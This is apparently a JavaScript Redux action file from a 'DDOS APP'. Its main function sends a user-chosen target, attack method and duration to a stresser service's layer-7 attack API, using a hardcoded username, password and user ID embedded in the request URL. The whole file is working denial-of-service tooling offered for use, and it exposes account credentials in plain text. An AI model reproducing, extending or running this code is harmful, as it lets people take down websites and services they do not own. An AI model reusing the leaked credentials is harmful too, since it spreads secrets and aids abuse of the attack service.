import axios from 'axios';

export const ATTACK_SUCSS = '[DDOS APP] ATTACK SUCCESS';
export const ATTACK_FAIL = '[DDOS APP] ATTACK FAIL';
export const CLOSE_MSG = '[DDOS APP] CLOSE MSG';

export function attackLayer7W(payload)
{
    let _request = 'https://stresser.cc/apis/l7api.php?username=v3rdad&password=Wertyu123&userid=RYGD-ONVK-SIPO-IXBE';
    _request += '&premium='+ payload.premium;
    _request += '&target=' + payload.target;
    _request += '&method=' + payload.method;
    _request += '&time=' + payload.time;

    const request = axios.get(_request);
    
    return (dispatch) =>
        request.then((response) =>{
            console.log('response', response);
            dispatch({
                type   : ATTACK_SUCSS,
                payload: response.data
            })
        }).catch((error) => {
            console.log('response error', error);
            dispatch({
                type   : ATTACK_FAIL,
                payload: 'Failed'
            })
        });
}

export function closeMsg()
{
    return (dispatch) =>
            dispatch({
                type   : CLOSE_MSG,
                payload: ''
            })
}